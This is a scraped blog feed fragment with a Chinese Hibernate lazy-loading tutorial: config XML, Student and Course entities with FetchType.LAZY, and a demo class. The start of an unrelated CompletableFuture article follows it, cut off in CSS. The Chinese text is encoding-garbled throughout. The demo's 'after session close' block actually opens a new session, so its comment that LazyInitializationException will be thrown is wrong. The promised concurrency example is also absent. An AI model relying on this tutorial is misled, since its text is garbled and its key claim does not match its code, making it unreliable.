12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hibernateçš„å»¶è¿ŸåŠ è½½ï¼ˆLazy Loadingï¼‰æ˜¯ä¸€ç§æ€§èƒ½ä¼˜åŒ–æŠ€æœ¯ï¼Œé€šè¿‡åœ¨éœ€è¦è®¿é—®æ•°æ®æ—¶æ‰å®é™…åŠ è½½å®ƒä»¬ï¼Œè€Œä¸æ˜¯åœ¨åˆå§‹åŠ è½½æ—¶å°†æ‰€æœ‰ç›¸å…³æ•°æ®å…¨éƒ¨åŠ è½½ã€‚è¿™ç§æ–¹å¼å¯ä»¥å‡å°‘ä¸å¿…è¦çš„æ•°æ®æŸ¥è¯¢å’Œå†…å­˜å¼€é”€ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å¤§å‹æ•°æ®é›†å’Œå¤æ‚çš„å¯¹è±¡å…³ç³»æ—¶ã€‚</p>
<h3 data-id="heading-0">å»¶è¿ŸåŠ è½½çš„å®ç°</h3>
<p>åœ¨Hibernateä¸­ï¼Œå»¶è¿ŸåŠ è½½é€šå¸¸åº”ç”¨äºé›†åˆåŠå…³è”å…³ç³»ä¸­ï¼Œæ¯”å¦‚<code>@OneToMany</code>ã€<code>@ManyToOne</code>ã€<code>@ManyToMany</code>ç­‰ã€‚é€šè¿‡æŒ‡å®šåŠ è½½ç­–ç•¥ï¼Œå¯ä»¥æ§åˆ¶å…³è”å®ä½“çš„åŠ è½½æ—¶æœºã€‚</p>
<h3 data-id="heading-1">ç¤ºä¾‹ä»£ç </h3>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•åœ¨Hibernateä¸­ä½¿ç”¨å»¶è¿ŸåŠ è½½ã€‚</p>
<h4 data-id="heading-2">é…ç½®æ–‡ä»¶ <code>hibernate.cfg.xml</code></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±»é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Student"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Course"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">HibernateUtil ç±»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä»é…ç½®æ–‡ä»¶åˆ›å»ºSessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// è®°å½•å¯åŠ¨å¤±è´¥çš„é”™è¯¯</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h4 data-id="heading-4">å®ä½“ç±» Student å’Œ Course</h4>
<h5 data-id="heading-5">Student ç±»</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Set;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-meta">@OneToMany(mappedBy = "student", fetch = FetchType.LAZY, cascade = CascadeType.ALL)</span>
    <span class="hljs-keyword">private</span> Set&lt;Course&gt; courses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// getters å’Œ setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-keyword">public</span> Set&lt;Course&gt; <span class="hljs-title function_">getCourses</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> courses;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCourses</span><span class="hljs-params">(Set&lt;Course&gt; courses)</span> {
        <span class="hljs-built_in">this</span>.courses = courses;
    }
}
</code></pre>
<h5 data-id="heading-6">Course ç±»</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Course</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@ManyToOne(fetch = FetchType.LAZY)</span>
    <span class="hljs-meta">@JoinColumn(name = "student_id")</span>
    <span class="hljs-keyword">private</span> Student student;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Course</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Course</span><span class="hljs-params">(String name, Student student)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.student = student;
    }

    <span class="hljs-comment">// getters å’Œ setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Student <span class="hljs-title function_">getStudent</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> student;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setStudent</span><span class="hljs-params">(Student student)</span> {
        <span class="hljs-built_in">this</span>.student = student;
    }
}
</code></pre>
<h3 data-id="heading-7">å»¶è¿ŸåŠ è½½ç¤ºä¾‹ä»£ç </h3>
<p>ä¸‹é¢çš„ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•åœ¨å¹¶å‘ç¯å¢ƒä¸­ä½¿ç”¨å»¶è¿ŸåŠ è½½ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Hibernate;
<span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateLazyLoadingExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è·å–SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// æ’å…¥ç¤ºä¾‹æ•°æ®</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// ç¤ºä¾‹: åœ¨æ‰“å¼€å’Œå…³é—­ä¼šè¯æ—¶è®¿é—®å»¶è¿ŸåŠ è½½çš„é›†åˆ</span>
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

        <span class="hljs-keyword">try</span> {
            session = sessionFactory.openSession();
            transaction = session.beginTransaction();

            <span class="hljs-comment">// è·å–Studentå¯¹è±¡</span>
            <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> session.get(Student.class, <span class="hljs-number">1L</span>);
            System.out.println(<span class="hljs-string">"Student: "</span> + student.getName() + <span class="hljs-string">", Age: "</span> + student.getAge());

            <span class="hljs-comment">// åœ¨ä¼šè¯å…³é—­å‰è®¿é—®å»¶è¿ŸåŠ è½½çš„é›†åˆ</span>
            System.out.println(<span class="hljs-string">"Courses (before session close): "</span> + student.getCourses().size());

            <span class="hljs-comment">// æ˜¾å¼åˆå§‹åŒ–å»¶è¿ŸåŠ è½½çš„é›†åˆ</span>
            Hibernate.initialize(student.getCourses());

            transaction.commit();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }

        <span class="hljs-comment">// åœ¨ä¼šè¯å…³é—­åè®¿é—®å»¶è¿ŸåŠ è½½çš„é›†åˆ</span>
        session = sessionFactory.openSession();
        transaction = session.beginTransaction();

        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> session.get(Student.class, <span class="hljs-number">1L</span>);
            System.out.println(<span class="hljs-string">"Student: "</span> + student.getName() + <span class="hljs-string">", Age: "</span> + student.getAge());

            <span class="hljs-comment">// ä¼šè¯å…³é—­åè®¿é—®å»¶è¿ŸåŠ è½½çš„é›†åˆä¼šå¼•å‘ LazyInitializationException</span>
            System.out.println(<span class="hljs-string">"Courses (after session close): "</span> + student.getCourses().size());

            transaction.commit();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }

        <span class="hljs-comment">// å…³é—­SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">20</span>);
            <span class="hljs-type">Course</span> <span class="hljs-variable">course1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Course</span>(<span class="hljs-string">"Mathematics"</span>, student);
            <span class="hljs-type">Course</span> <span class="hljs-variable">course2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Course</span>(<span class="hljs-string">"Physics"</span>, student);
            student.getCourses().add(course1);
            student.getCourses().add(course2);
            session.save(student);
            transaction.commit();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-8">è¯¦ç»†è§£é‡Š</h3>
<ol>
<li>
<p><strong>é…ç½®å»¶è¿ŸåŠ è½½</strong>ï¼šåœ¨å®ä½“ç±»çš„å…³è”å­—æ®µä¸Šæ·»åŠ <code>fetch = FetchType.LAZY</code>æ³¨è§£ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@OneToMany(mappedBy = "student", fetch = FetchType.LAZY, cascade = CascadeType.ALL)</span>
<span class="hljs-keyword">private</span> Set&lt;Course&gt; courses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
</code></pre>
</li>
<li>
<p><strong>ç¤ºä¾‹åœºæ™¯</strong>ï¼š</p>
<ul>
<li>åœ¨ä¸€ä¸ªä¼šè¯ä¸­è·å–Studentå¯¹è±¡åŠå…¶å…³è”çš„Courseé›†åˆã€‚</li>
<li>åœ¨ä¼šè¯å…³é—­å‰è®¿é—®å»¶è¿ŸåŠ è½½çš„é›†åˆä¼šè§¦å‘é›†åˆçš„åˆå§‹åŒ–ã€‚</li>
<li>ä½¿ç”¨<code>Hibernate.initialize</code>æ–¹æ³•æ˜¾å¼åœ°åˆå§‹åŒ–å»¶è¿ŸåŠ è½½çš„é›†åˆã€‚</li>
<li>ä¼šè¯å…³é—­åè®¿é—®å»¶è¿ŸåŠ è½½çš„é›†åˆä¼šå¼•å‘<code>LazyInitializationException</code>å¼‚å¸¸ã€‚</li>
</ul>
</li>
<li>
<p><strong>äº‹åŠ¡ç®¡ç†</strong>ï¼šåœ¨äº‹åŠ¡ä¸­è¿›è¡Œæ•°æ®æ“ä½œï¼Œå¹¶åœ¨æ“ä½œå®Œæˆåæäº¤äº‹åŠ¡ã€‚å¦‚æœæ“ä½œå¤±è´¥ï¼Œåˆ™å›æ»šäº‹åŠ¡ä»¥ç¡®ä¿æ•°æ®ä¸€è‡´æ€§ã€‚</p>
</li>
</ol>
<h3 data-id="heading-9">æ€»ç»“</h3>
<p>å»¶è¿ŸåŠ è½½æ˜¯ä¸€ç§æœ‰æ•ˆçš„æ€§èƒ½ä¼˜åŒ–æŠ€æœ¯ï¼Œé€šè¿‡åœ¨éœ€è¦è®¿é—®æ•°æ®æ—¶æ‰å®é™…åŠ è½½å®ƒä»¬ï¼Œå¯ä»¥å‡å°‘ä¸å¿…è¦çš„æ•°æ®æŸ¥è¯¢å’Œå†…å­˜å¼€é”€ã€‚åœ¨Hibernateä¸­ï¼Œé€šè¿‡<code>fetch = FetchType.LAZY</code>æ³¨è§£å¯ä»¥æ–¹ä¾¿åœ°å®ç°å»¶è¿ŸåŠ è½½ã€‚ç†è§£å¹¶æ­£ç¡®åº”ç”¨å»¶è¿ŸåŠ è½½ï¼Œå¯ä»¥æœ‰æ•ˆåœ°æé«˜åº”ç”¨çš„æ€§èƒ½å’Œèµ„æºåˆ©ç”¨ç‡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¹¶è¡Œä¸ç­‰äºæ›´å¿«ï¼šCompletableFuture è®©ä½ æ›´æ…¢çš„ 5 ä¸ªå§¿åŠ¿]]></title>    <link>https://juejin.cn/post/7589893746081169449</link>    <guid>https://juejin.cn/post/7589893746081169449</guid>    <pubDate>2026-01-02T01:37:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589893746081169449" data-draft-id="7590054976488882216" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¹¶è¡Œä¸ç­‰äºæ›´å¿«ï¼šCompletableFuture è®©ä½ æ›´æ…¢çš„ 5 ä¸ªå§¿åŠ¿"/> <meta itemprop="keywords" content="åç«¯,æ€§èƒ½ä¼˜åŒ–,Java"/> <meta itemprop="datePublished" content="2026-01-02T01:37:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€åªå«ç…¤çƒçš„çŒ«"/> <meta itemprop="url" content="https://juejin.cn/user/1732486058745054"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¹¶è¡Œä¸ç­‰äºæ›´å¿«ï¼šCompletableFuture è®©ä½ æ›´æ…¢çš„ 5 ä¸ªå§¿åŠ¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1732486058745054/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€åªå«ç…¤çƒçš„çŒ«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T01:37:52.000Z" title="Fri Jan 02 2026 01:37:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 